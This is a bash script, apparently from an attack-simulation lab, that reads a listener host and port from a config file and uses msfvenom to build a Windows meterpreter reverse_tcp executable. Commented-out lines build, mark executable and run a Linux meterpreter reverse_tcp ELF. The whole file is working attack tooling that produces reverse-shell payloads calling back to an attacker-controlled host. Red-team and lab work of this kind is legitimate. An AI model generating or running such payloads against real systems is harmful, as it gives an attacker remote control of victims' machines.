#!/bin/bash
# scripts/shellcode.sh

CONFIG_FILE="/etc/attack-config.yml"

# Extract variables using yq
LHOST=$(yq e '.shellcode.lhost' "$CONFIG_FILE")
LPORT=$(yq e '.shellcode.lport' "$CONFIG_FILE")

echo "Starting Shellcode Attack: Generating payload with MSFvenom..."

# Define payload output path
PAYLOAD_OUTPUT="/opt/attack-scripts/payload.exe"

# Generate shellcode payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe > "$PAYLOAD_OUTPUT"

echo "Payload generated at $PAYLOAD_OUTPUT."

# Note: Executing Windows payload on Ubuntu-based container won't work.
# For simulation purposes, you can skip execution or use cross-platform payloads.
# Example: Using a Linux payload instead
# Uncomment below lines to generate a Linux payload

# PAYLOAD_OUTPUT_LINUX="/opt/attack-scripts/payload.elf"
# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf > "$PAYLOAD_OUTPUT_LINUX"
# chmod +x "$PAYLOAD_OUTPUT_LINUX"
# ./payload.elf
